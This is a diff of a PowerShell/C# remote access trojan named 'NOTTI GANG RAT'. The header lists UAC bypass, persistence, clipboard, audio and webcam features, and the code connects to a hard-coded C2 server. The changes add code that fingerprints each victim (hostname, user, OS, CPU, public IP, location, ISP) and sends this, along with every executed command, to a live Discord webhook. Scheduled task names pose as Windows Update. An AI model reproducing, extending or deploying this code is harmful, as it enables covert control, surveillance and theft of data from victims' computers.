@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent Completo: Webhook (Sem ping), Persistencia, UAC Bypass, Clipboard, Audio, Webcam
+# Agent Completo: NOTTI GANG RAT (Webhook Embed + UAC Bypass + Features)
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -14,11 +14,19 @@ $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# Função para Log no Discord (Corrigida sem crases)
+# Função para Log no Discord (Agora como Embed vermelho para comandos)
 function Send-Webhook($msg) {
     try {
-        $content = "[R9K C2] $env:COMPUTERNAME ($env:USERNAME) `n" + $msg
-        $body = @{ content = $content } | ConvertTo-Json
+        $body = @{
+            embeds = @(
+                @{
+                    title = "⚡ NOTTI GANG RAT | Comando"
+                    color = 16711680
+                    description = "``$msg``"
+                    footer = @{ text = "$env:COMPUTERNAME | NOTTI GANG RAT" }
+                }
+            )
+        } | ConvertTo-Json -Depth 10
         Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 }
@@ -269,6 +277,19 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
+        // Função auxiliar para extrair valores simples do JSON do ip-api
+        static string ExtractJsonValue(string json, string key) {
+            try {
+                int idx = json.IndexOf("\"" + key + "\"");
+                if (idx == -1) return "Desconhecido";
+                int start = json.IndexOf(":", idx) + 1;
+                int end = json.IndexOf(",", start);
+                if (end == -1) end = json.IndexOf("}", start);
+                string val = json.Substring(start, end - start).Trim();
+                return val.Trim('"');
+            } catch { return "Desconhecido"; }
+        }
+
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             try { SetProcessDPIAware(); } catch {}
@@ -297,13 +318,49 @@ if (-not ("R9KAgent" -as [type])) {
                     string banner = "BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|" + nMon;
                     myWriter.WriteLine(banner);
                     
-                    // Log de Conexao Discord
-                    try { 
-                        System.Net.WebClient wc = new System.Net.WebClient(); 
-                        wc.Headers.Add("Content-Type", "application/json"); 
-                        string body = "{\"content\":\"**[R9K C2]** Nova conexao de " + Environment.MachineName + " (" + Environment.UserName + ")\"}"; 
-                        wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
+                    // === WEBHOOK EMBED NOTTI GANG RAT ===
+                    try {
+                        string pubIp = "Desconhecido", country = "Desconhecido", city = "Desconhecido", isp = "Desconhecido";
+                        try {
+                            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
+                            System.Net.WebClient wcIp = new System.Net.WebClient();
+                            wcIp.Headers.Add("User-Agent", "Mozilla/5.0");
+                            string ipInfo = wcIp.DownloadString("http://ip-api.com/json/?fields=status,country,city,isp,query");
+                            if (ipInfo.Contains("\"status\":\"success\"")) {
+                                pubIp = ExtractJsonValue(ipInfo, "query");
+                                country = ExtractJsonValue(ipInfo, "country");
+                                city = ExtractJsonValue(ipInfo, "city");
+                                isp = ExtractJsonValue(ipInfo, "isp");
+                            }
+                        } catch { }
+
+                        string cpu = "Desconhecido";
+                        try { cpu = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "").ToString().Trim(); } catch {}
+                        
+                        string os = Environment.OSVersion.ToString();
+                        string timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ");
+                        
+                        string jsonPayload = "{\"embeds\":[{" +
+                            "\"title\":\"🟢 NOTTI GANG RAT | Nova Conexão\"," +
+                            "\"color\":65280," +
+                            "\"fields\":[" +
+                                "{\"name\":\"💻 Hostname\",\"value\":\"`" + Environment.MachineName + "`\",\"inline\":true}," +
+                                "{\"name\":\"👤 Usuário\",\"value\":\"`" + Environment.UserName + "`\",\"inline\":true}," +
+                                "{\"name\":\"💿 Sistema\",\"value\":\"`" + os + "`\",\"inline\":false}," +
+                                "{\"name\":\"⚙️ CPU\",\"value\":\"`" + cpu + "`\",\"inline\":false}," +
+                                "{\"name\":\"🌐 IP Público\",\"value\":\"`" + pubIp + "`\",\"inline\":true}," +
+                                "{\"name\":\"🌍 Localização\",\"value\":\"`" + country + " / " + city + "`\",\"inline\":true}," +
+                                "{\"name\":\"🏢 Provedor (ISP)\",\"value\":\"`" + isp + "`\",\"inline\":true}" +
+                            "]," +
+                            "\"footer\":{\"text\":\"NOTTI GANG RAT - Logs\"}," +
+                            "\"timestamp\":\"" + timestamp + "\"" +
+                        "}]}";
+
+                        System.Net.WebClient wcDisc = new System.Net.WebClient();
+                        wcDisc.Headers.Add("Content-Type", "application/json");
+                        wcDisc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", jsonPayload);
                     } catch {}
+                    // ===================================
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
@@ -637,7 +694,7 @@ if (-not ("R9KAgent" -as [type])) {
                     try { 
                         System.Net.WebClient wc = new System.Net.WebClient(); 
                         wc.Headers.Add("Content-Type", "application/json"); 
-                        string body = "{\"content\":\"**[R9K CMD]** " + Environment.MachineName + " executou: " + cmd + "\"}"; 
+                        string body = "{\"embeds\":[{\"title\":\"⚡ NOTTI GANG RAT | Comando\",\"color\":16711680,\"description\":\"`" + cmd + "`\",\"footer\":{\"text\":\"" + Environment.MachineName + " | NOTTI GANG RAT\"}}]}"; 
                         wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
                     } catch {}
                 }
